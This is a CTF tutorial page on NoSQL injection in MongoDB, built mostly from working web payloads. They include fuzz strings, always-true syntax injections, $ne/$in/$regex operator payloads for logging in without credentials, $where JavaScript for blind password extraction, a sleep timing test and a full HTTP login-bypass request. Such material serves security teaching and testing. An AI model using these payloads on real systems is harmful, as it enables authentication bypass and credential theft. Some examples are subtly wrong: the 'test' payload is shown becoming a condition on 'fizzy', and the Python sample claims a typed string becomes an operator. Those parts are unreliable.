---
title: "NoSQL Injection"
description: "Exploit unsanitized NoSQL queries in MongoDB or similar databases to bypass authentication or extract documents."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["nosql", "mongodb", "injection", "ctf"]
authors: ["CTF.Support Team"]
summary: "Understand how crafted JSON input can manipulate NoSQL queries, leading to authentication bypass or data retrieval."
aliases: ["/web/nosql-injection/"]
slug: "nosql-injection"
toc: true
---

## Introduction

NoSQL databases like MongoDB rely heavily on JSON objects, which can be manipulated by attackers if input is not sanitized.

If exploited, NoSQL Injection can allow attackers to:

- Bypass authentication or authorization checks.  
- Extract or modify data from collections.  
- Perform denial‑of‑service actions with heavy queries.  
- Execute JavaScript on the database server (via `$where` or `mapReduce()` in MongoDB).

## Types of NoSQL Injection

| Type                   | Description                                                                                                          |
|------------------------|----------------------------------------------------------------------------------------------------------------------|
| **Syntax Injection**   | Breaks the query syntax to inject arbitrary logic. Similar to SQLi but varies between databases and query languages. |
| **Operator Injection** | Abuses built‑in query operators (`$ne`, `$in`, `$regex`, `$where`) to override or manipulate query conditions.       |

Most attacks target **MongoDB**, but the same principles apply to CouchDB, Redis, and other JSON‑based stores.

## Detecting Vulnerabilities

Try fuzzing each user‑controlled input with special characters to determine whether the application parses them within queries.

Example payload (for URL parameter):

```text
?param='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Differences in server responses, errors, filtered output, or longer load time, suggest NoSQL parser interaction.

### Character Testing

Inject individual characters such as `'`, `"`, `\`, `;`, `{`, `}` to see which break the query string.

### Conditional Behavior Testing

Send boolean variants:

```text
?param=test'+%26%26+0+%26%26+'x

?param=test'+%26%26+1+%26%26+'x
```

Different responses confirm code evaluation.

## Syntax Injection Exploitation

Once control is confirmed, override existing conditions with always‑true statements:

```text
?param=test'||1||'
```

This becomes:

```js
this.param == 'fizzy' || '1'=='1'
```

You can also append a **null byte** (`%00`) to truncate remaining query parts:

```text
?param=test'%00
```

## Operator Injection Examples

For JSON requests:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Logs in as the first user (often `admin`).

Target a specific user:

```json
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```

Use `$regex` to extract data:

```json
{"username":"admin","password":{"$regex":"^a"}}
```

## Data Extraction via Operators and JavaScript

If `$where` or `mapReduce()` is supported, execute JavaScript within queries:

```js
{"$where":"this.password[0] == 'a'"}
```

Iterate characters to rebuild credentials.

Check for digits using regex:

```js
{"$where":"this.password.match(/\\d/)"}
```

Blind extraction with `$regex`:

```js
{"password":{"$regex":"^a.*"}}
```

Timing‑based test:

```js
{"$where":"sleep(5000)"}
```

## Example (Python)

```python
from pymongo import MongoClient

def get_user(username):
    client = MongoClient('mongodb://localhost:27017/')
    db = client['users']
    query = {'username': username}
    return db.users.find(query)

username = input('Enter a username: ')
print(list(get_user(username)))
```

Injection:

```json
{"$ne": null}
```

Resulting query:

```json
{ "username": {"$ne": null} }
```

This bypasses user filtering and returns all results.

### Example: Bypassing Login Using $ne

```text
POST /login HTTP/1.1
Host: target.ctf
Content-Type: application/json

{
  "username":{"$ne":""},
  "password":{"$ne":""}
}
```

If both fields parse operators, the query becomes:

```js
db.users.find({ "username": { $ne: "" }, "password": { $ne: "" } })
```

and logs you in as the first user (often `admin`).

## Tips

- Input contexts to test: query filters, `$where` clauses, `$regex`, `$gt/$lt`.
- Use JSON-oriented payloads (`{"$ne": null}` or `{"$gt": ""}`).
- Escape or validate JSON structures before execution.
- In blind challenges, look for time-based payloads using heavy operations.
